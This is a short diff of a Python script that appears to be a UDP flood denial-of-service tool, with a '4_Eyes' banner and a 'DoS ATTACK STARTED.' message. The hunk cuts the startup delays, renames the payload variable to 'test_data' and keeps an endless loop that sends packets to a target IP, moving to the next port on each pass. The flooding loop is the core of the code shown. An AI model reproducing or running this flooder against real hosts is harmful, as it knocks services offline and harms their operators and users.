@@ -31,12 +31,11 @@ print(r""" _  _              ____      _
 print("Team : 4eyes")
 print ("\033[92m")
 print("__________________________4_Eyes_______________________________")
-time.sleep(3)
 print("DoS ATTACK STARTED.")
-time.sleep(3)
+time.sleep(1)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(test_data, (ip, port))
      sent = sent + 1
      port = port + 1
      print(f"Sent {sent} packet to {ip} through port: {port}")
